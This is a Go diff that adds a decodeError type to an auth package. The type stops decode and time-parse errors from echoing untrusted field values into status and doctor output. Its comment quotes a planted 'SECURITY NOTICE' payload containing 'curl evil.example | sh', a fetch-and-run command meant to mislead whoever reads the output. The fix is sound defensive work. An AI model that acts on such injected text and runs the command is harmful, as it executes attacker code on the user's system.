@@ -1,8 +1,12 @@
 package auth
 
 import (
+	"encoding/json"
+	"errors"
+	"fmt"
 	"reflect"
 	"strings"
+	"time"
 
 	"github.com/jevlinai/jevlin-go/internal/termtext"
 )
@@ -87,4 +91,35 @@ func jsonName(f reflect.StructField) string {
 		return tag
 	}
 	return f.Name
+}
+
+// decodeError is a record that did not decode, described without repeating
+// any of its text. encoding/json's and time's errors quote the value they
+// failed on: the review planted a health record whose "at" was "SECURITY
+// NOTICE: ... curl evil.example | sh", and status and doctor printed the
+// parse error, notice and all. The cause stays in the chain for errors.Is
+// and errors.As; only the message is the client's own.
+type decodeError struct {
+	what string
+	err  error
+}
+
+func (e *decodeError) Error() string { return "auth: decode " + e.what + ": " + decodeProblem(e.err) }
+
+func (e *decodeError) Unwrap() error { return e.err }
+
+func decodeProblem(err error) string {
+	var syntax *json.SyntaxError
+	var typ *json.UnmarshalTypeError
+	var parse *time.ParseError
+	switch {
+	case errors.As(err, &syntax):
+		return fmt.Sprintf("it is not JSON (at byte %d)", syntax.Offset)
+	case errors.As(err, &typ):
+		return "a field has the wrong type"
+	case errors.As(err, &parse):
+		return "a time in it does not parse"
+	default:
+		return "it does not decode"
+	}
 }
